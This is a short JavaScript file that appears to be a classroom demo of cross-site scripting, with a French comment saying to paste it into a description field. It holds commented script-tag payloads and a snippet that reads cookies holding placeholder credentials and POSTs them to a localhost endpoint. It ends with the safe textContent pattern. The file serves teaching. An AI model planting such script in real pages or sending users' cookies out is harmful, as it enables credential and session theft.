console.log('hello');


/** @info
 * A coller dans le input description pour la demo
 * */

// <script>
//
// const p = document.querySelectorAll('p');
//
// for (const e of p) {
//     e.style.color = 'red';
// }
// </script>

// <script>
//     const p = document.querySelectorAll('p');
//
//     for (const e of p) {
//     e.style.color = 'red';
// }
// </script>

document.cookie = "username=Deschger+1;";
document.cookie = "email=email+1@xss.fr;";
document.cookie = "password=password;";

// function parseCookies() {
//     const cookieString = document.cookie || "";
//     return cookieString.split(";").reduce((cookies, pair) => {
//         const [name, value] = pair.split("=").map(c => c.trim());
//         if (name) {
//             cookies[decodeURIComponent(name)] = decodeURIComponent(value || "");
//         }
//         return cookies;
//     }, {});
// }
//
// let dataCookies = parseCookies();
/*console.log(document.cookie)
console.log(dataCookies)
console.log(dataCookies)*/
//
// function parseCookies() {
//     const cookieString = document.cookie || "";
//     return cookieString.split(";").reduce((cookies, pair) => {
//         const [name, value] = pair.split("=").map(c => c.trim());
//         if (name) {
//             cookies[decodeURIComponent(name)] = decodeURIComponent(value || "");
//         }
//         return cookies;
//     }, {});
// }
//
// let dataCookies = parseCookies();
//
// const url = "http://localhost:4000/api/auth/register";
//
// fetch(url, {
//     method: 'POST',
//     headers: {
//         'Content-Type': 'application/json'
//     },
//     body: JSON.stringify({
//         username: dataCookies['username'],
//         email: dataCookies['email'],
//         password: dataCookies['password'],
//     }),
// });
//

// const main = document.querySelector('main');
//
// const p = document.createElement('p');
// p.textContent = userInput;
